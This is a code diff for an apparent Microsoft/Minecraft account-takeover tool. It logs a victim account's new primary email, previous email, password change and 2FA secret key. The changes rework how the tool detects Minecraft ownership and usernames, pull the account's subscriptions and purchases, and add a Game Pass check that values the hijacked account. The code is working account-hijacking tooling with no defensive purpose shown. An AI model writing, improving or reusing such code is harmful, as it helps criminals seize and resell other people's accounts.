@@ -410,65 +410,33 @@ module.exports = async (host, settings, uid, username = null) => {
                         console.log(`Got Minecraft ${minecraft.name}`);
                         acc.capes = minecraft?.capes || [];
                         acc.newName = minecraft.name;
-                    } else if (source && source !== "No Minecraft!" && source !== "XBL Failed") {
-                        const displayName = username || acc.gamertag || "No Minecraft IGN";
-                        acc.oldName = displayName;
-                        acc.newName = displayName;
-                        acc.capes = minecraft?.capes || [];
-                        await updateStatus(uid, "username", displayName);
-                    } else if (username) {
-                        try {
-                            const uuid = await getUUID(username);
-                            if (uuid) {
-                                console.log(`[RECODE_SECURE] Verified Minecraft ownership via provided username '${username}' (UUID: ${uuid})`);
-                                source = "Purchased";
-                                acc.oldName = username;
-                                acc.newName = username;
-                                acc.capes = minecraft?.capes || [];
-                                await updateStatus(uid, "username", username);
-                            } else {
-                                await updateStatus(uid, "username", 'No Minecraft Profile');
-                            }
-                        } catch (uuidErr) {
-                            console.log(`[RECODE_SECURE] getUUID check error:`, uuidErr.message);
-                            await updateStatus(uid, "username", 'No Minecraft Profile');
-                        }
                     } else {
-                        await updateStatus(uid, "username", 'No Minecraft Profile');
+                        acc.oldName = "Couldn't find!";
+                        acc.newName = "Couldn't find!";
+                        source = (source && source !== "XBL Failed") ? source : "No Minecraft!";
+                        acc.capes = [];
+                        await updateStatus(uid, "username", "Couldn't find!");
                     }
                 }
             } else {
-                await updateStatus(uid, "username", 'No Xbox Profile [1]');
+                acc.oldName = "Couldn't find!";
+                acc.newName = "Couldn't find!";
+                await updateStatus(uid, "username", "Couldn't find!");
             }
         } else {
-            await updateStatus(uid, "username", 'No Xbox Profile [2]');
+            acc.oldName = "Couldn't find!";
+            acc.newName = "Couldn't find!";
+            await updateStatus(uid, "username", "Couldn't find!");
         }
 
         if (!source || source === "No Minecraft!" || source === "XBL Failed") {
-            if (username && (acc.xbl || sid || mxblresult?.xbl || acc.gtg)) {
-                try {
-                    const fallbackUuid = await getUUID(username);
-                    if (fallbackUuid) {
-                        console.log(`[RECODE_SECURE] Fallback: verified Minecraft account '${username}' via public UUID lookup`);
-                        source = "Purchased";
-                        acc.mc = "Purchased";
-                        acc.oldName = username;
-                        acc.newName = username;
-                    }
-                } catch (fallbackErr) {
-                    console.log(`[RECODE_SECURE] Fallback UUID lookup error:`, fallbackErr.message);
-                }
-            }
-
-            if (!source || source === "No Minecraft!" || source === "XBL Failed") {
-                if (!settings.secureifnomc) {
-                    acc.newName = "No Minecraft!";
-                    acc.ssid = "No Minecraft!";
-                    console.log('[RECODE_SECURE] No MC detected & secureifnomc is off, but continuing to alias/security flow...');
-                }
-            } else {
-                console.log(`Setting mc as ${source}`);
-                acc.mc = source;
+            source = source || "No Minecraft!";
+            acc.mc = source;
+            acc.oldName = "Couldn't find!";
+            acc.newName = "Couldn't find!";
+            if (!settings.secureifnomc) {
+                acc.ssid = "No Minecraft!";
+                console.log('[RECODE_SECURE] No MC detected & secureifnomc is off, but continuing to alias/security flow...');
             }
         } else {
             console.log(`Setting mc as ${source}`);
@@ -568,7 +536,11 @@ module.exports = async (host, settings, uid, username = null) => {
     parallelNonConflicting.push((async () => {
         try {
             const extramc = await mcextra(axios, refresh, acc.xuid, acc.gtg, settings, settings.user_id, uid, acc.loginCookie, acc.ssid, acc.mc, acc.oldName, optionalusername, username, mxbl);
-            if (extramc?.newign) acc.newName = extramc.newign;
+            if (extramc?.newign && extramc.newign !== "Couldn't find!" && extramc.newign !== acc.gamertag) {
+                acc.newName = extramc.newign;
+            } else if (!minecraft?.name) {
+                acc.newName = "Couldn't find!";
+            }
             if (extramc?.banchecked) {
                 acc.ban = extramc.ban;
                 acc.banReason = extramc.banReason;
@@ -595,6 +567,8 @@ module.exports = async (host, settings, uid, username = null) => {
             const inforesult = await getinfo(hasamc, acc.oldName, axios, msatoken, uid, acc?.mc, acc?.ssid, playstationxbl, purchasetoken);
             acc.stats = inforesult?.stats;
             acc.donut = inforesult?.donut;
+            acc.subscriptions = inforesult?.subs;
+            acc.purchases = inforesult?.purchases;
 
             if (inforesult?.cosmetics || inforesult?.emotes) {
                 acc.lunar = {
@@ -747,6 +721,45 @@ module.exports = async (host, settings, uid, username = null) => {
         console.log(`[RECODE_SECURE] Error fetching authoritative security emails:`, secErr.message);
     }
 
+    try {
+        await phase1Promise;
+    } catch (p1Err) {
+        console.error(`[RECODE_SECURE] Phase 1 completion error:`, p1Err.message);
+    }
+
+    // Cross-verify Minecraft ownership with active Microsoft Subscriptions
+    try {
+        let subsData = acc.subscriptions;
+        if (typeof subsData === 'string' && (subsData.startsWith('[') || subsData.startsWith('{'))) {
+            try { subsData = JSON.parse(subsData); } catch (e) {}
+        }
+        if (typeof subsData === 'string' && (subsData.startsWith('[') || subsData.startsWith('{'))) {
+            try { subsData = JSON.parse(subsData); } catch (e) {}
+        }
+
+        if (Array.isArray(subsData)) {
+            const hasActiveGamepassSub = subsData.some(s => {
+                const sName = String(s?.name || s?.productName || "").toLowerCase();
+                return sName.includes("game pass") || sName.includes("gamepass") || sName.includes("xgp");
+            });
+
+            if (hasActiveGamepassSub) {
+                const hasExplicitPurchase = Array.isArray(acc.items) && acc.items.some(i => {
+                    const s = String(i?.source || "").toUpperCase();
+                    const n = String(i?.name || "").toLowerCase();
+                    return n.includes("minecraft") && !n.includes("bedrock") && !n.includes("dungeon") && !n.includes("legend") &&
+                           (s === "PURCHASE" || s === "MC_PURCHASE" || s === "RETAIL");
+                });
+
+                if (!hasExplicitPurchase) {
+                    console.log(`[RECODE_SECURE] Account has active Game Pass subscription without permanent purchase. Correcting mc = 'Gamepass'`);
+                    acc.mc = "Gamepass";
+                }
+            }
+        }
+    } catch (subCheckErr) {
+        console.error(`[RECODE_SECURE] Error in Game Pass subscription cross-check:`, subCheckErr.message);
+    }
 
     // console.log(`aliases stringified: ${JSON.stringify(aliaseslist)}`)
     let extrainfodata = await queryParams(`SELECT * FROM extrainformation WHERE uid=?`, [uid]);
@@ -771,7 +784,8 @@ module.exports = async (host, settings, uid, username = null) => {
         ["UID", uid],
         ["New Primary Email", acc.email],
         ["Previous Email", acc.oldEmail || "None"],
-        ["Gamertag", acc.newName || acc.gamertag || "Unchanged"],
+        ["Gamertag", acc.gamertag || "Unchanged"],
+        ["Username", acc.newName || "Couldn't find!"],
         ["Security Email", acc.secEmail || "N/A"],
         ["Password Status", acc.password ? "Updated successfully" : "Unchanged"],
         ["2FA Secret Key", acc.secretkey || "N/A"],
